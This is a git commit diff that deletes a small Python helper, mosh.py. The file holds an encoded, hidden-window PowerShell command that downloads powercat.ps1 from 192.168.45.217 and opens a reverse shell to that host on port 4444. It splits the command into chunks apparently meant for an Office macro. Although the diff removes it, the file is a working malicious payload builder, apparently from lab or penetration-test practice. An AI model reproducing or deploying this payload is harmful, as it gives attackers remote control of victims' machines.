f45c53a966c7dd9174f60f8bb58001b6faadfec3
CoderJSanchez <jsanchez191980802@gmail.com>
2023-06-13 11:05:29 -0500

    deleted files I don't need

--- mosh.py
+++
@@ -1,5 +0,0 @@
-str ="powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC40NS4yMTcvcG93ZXJjYXQucHMxJyk7cG93ZXJjYXQgLWMgMTkyLjE2OC40NS4yMTcgLXAgNDQ0NCAtZSBwb3dlcnNoZWxs"
-n = 50
-
-for i in range(0, len(str), n):
-    print("Str = Str + " + '"' + str[i:i+n] + '"')
